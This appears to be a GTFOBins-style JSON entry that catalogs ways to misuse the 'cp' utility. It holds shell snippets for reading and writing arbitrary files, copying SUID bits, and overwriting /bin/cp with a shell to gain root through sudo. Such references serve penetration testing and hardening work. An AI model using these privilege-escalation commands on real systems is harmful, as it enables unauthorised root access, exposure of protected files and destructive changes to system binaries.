{
  "functions": {
    "file-read": [
      {
        "code": "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout\n"
      }
    ],
    "file-write": [
      {
        "code": "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n"
      }
    ],
    "suid": [
      {
        "code": "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"
      },
      {
        "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n"
      },
      {
        "description": "This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.",
        "code": "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n"
      }
    ],
    "sudo": [
      {
        "code": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n"
      },
      {
        "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n"
      },
      {
        "description": "This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.",
        "code": "sudo cp /bin/sh /bin/cp\nsudo cp\n"
      }
    ]
  }
}
